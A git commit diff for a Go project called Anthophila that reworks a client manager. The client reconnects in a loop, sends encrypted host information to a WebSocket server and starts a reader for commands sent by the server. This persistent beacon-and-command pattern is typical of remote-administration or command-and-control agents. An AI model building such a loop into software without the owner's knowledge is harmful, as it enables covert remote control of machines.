785ca38015fd3c7fd78cf9e4f684e095b62aac68
Rifat Ismailov <refaazer@gmail.com>
2025-06-02 13:36:35 +0300

    Initial commit

--- management/manager.go
+++ management/manager.go
@@ -3,6 +3,7 @@ package management
 import (
 	"Anthophila/information"
 	"Anthophila/logging"
+	"fmt"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -31,70 +32,56 @@ func NewManager(logStatus bool, logAddress, serverAddr, key string) *Manager {
 
 // Start ініціалізує WebSocket-зʼєднання і запускає логіку обміну повідомленнями
 func (m *Manager) Start() {
-	// Отримання MAC-адреси пристрою
-	cryptoManager, errEncrypt := NewCryptoManager(m.LogStatus, m.LogAddress, m.Key)
-	if errEncrypt != nil {
-		logging.Log(m.LogAddress, "Failed to initialize CryptoManager:v", errEncrypt.Error())
+	for {
+		if err := m.run(); err != nil && m.LogStatus {
+			logging.Log(m.LogAddress, "Connection error: %v. Retrying in %v...", err.Error())
+		}
+		time.Sleep(reconnectInterval)
 	}
-	nickname := information.NewInfo().InfoJson()
+}
 
-	var wSocket *websocket.Conn
-	var err error
+func (m *Manager) run() error {
+	cryptoManager, err := NewCryptoManager(m.LogStatus, m.LogAddress, m.Key)
+	if err != nil || cryptoManager == nil {
+		return fmt.Errorf("failed to init CryptoManager: %v", err)
+	}
+
+	nickname := information.NewInfo().InfoJson()
+	ws, _, err := websocket.DefaultDialer.Dial(m.ServerAddr, nil)
+	if err != nil {
+		return fmt.Errorf("failed to connect: %w", err)
+	}
+	defer ws.Close()
+
+	encryptName := cryptoManager.EncryptText(nickname)
+	if encryptName == "" {
+		err := fmt.Errorf("failed to encrypt nickname")
+		if m.LogStatus {
+			logging.Log(m.LogAddress, "Crypto error", err.Error())
+		}
+		return err
+	}
+
+	if err := ws.WriteMessage(websocket.TextMessage, []byte("nick:"+encryptName)); err != nil {
+		if m.LogStatus {
+			logging.Log(m.LogAddress, "WebSocket send error", err.Error())
+		}
+		return err
+	}
+
+	reader := NewReader(m.LogStatus, m.LogAddress, cryptoManager, ws)
+	go reader.ReadMessageCommand(ws)
+
+	// Пінг-сервер кожні N секунд
+	ticker := time.NewTicker(reconnectInterval)
+	defer ticker.Stop()
 
 	for {
-		// Спроба підключення до сервера WebSocket
-		wSocket, _, err = websocket.DefaultDialer.Dial(m.ServerAddr, nil)
-		if err != nil {
-			// Логування помилки підключення
-			if m.LogStatus {
-				logging.Log(m.LogAddress, "Error connecting to server: %v", err.Error())
-				logging.Log(m.LogAddress, "Retrying in %v...", reconnectInterval.String())
-			}
-			// Затримка перед наступною спробою підключення
-			time.Sleep(reconnectInterval)
-			continue
-		}
-
-		// Підключення успішне, надсилаємо шифрорваний нікнейм
-		err = wSocket.WriteMessage(websocket.TextMessage, []byte("nick:"+cryptoManager.EncryptText(nickname)))
-		if err != nil {
-			// Логування помилки відправки нікнейму
-			if m.LogStatus {
-				logging.Log(m.LogAddress, "Error sending nickname: %v", err.Error())
-			}
-			wSocket.Close()
-			if m.LogStatus {
-				logging.Log(m.LogAddress, "Retrying in %v...", reconnectInterval.String())
-			}
-			// Затримка перед наступною спробою підключення
-			time.Sleep(reconnectInterval)
-			continue
-		}
-
-		// Запуск горутіни для обробки отриманих повідомлень від сервера
-		reader := NewReader(m.LogStatus, m.LogAddress, cryptoManager, wSocket)
-		go reader.ReadMessageCommand(wSocket)
-
-		// Основний цикл для надсилання повідомлень до сервера
-		for {
-			time.Sleep(reconnectInterval)
-
-			errPing := wSocket.WriteMessage(websocket.TextMessage, []byte("Ping"))
-
-			if errPing != nil {
-				if m.LogStatus {
-					logging.Log(m.LogAddress, "Error writing to server: %v", errPing.Error())
-				}
-				break
+		select {
+		case <-ticker.C:
+			if err := ws.WriteMessage(websocket.TextMessage, []byte("Ping")); err != nil {
+				return fmt.Errorf("ping failed: %w", err)
 			}
 		}
-
-		// Якщо ми потрапили сюди, це означає, що з'єднання було розірвано
-		if m.LogStatus {
-			logging.Log(m.LogAddress, "Connection closed. Retrying in %v...", reconnectInterval.String())
-		}
-		wSocket.Close()
-		// Затримка перед наступною спробою підключення
-		time.Sleep(reconnectInterval)
 	}
 }
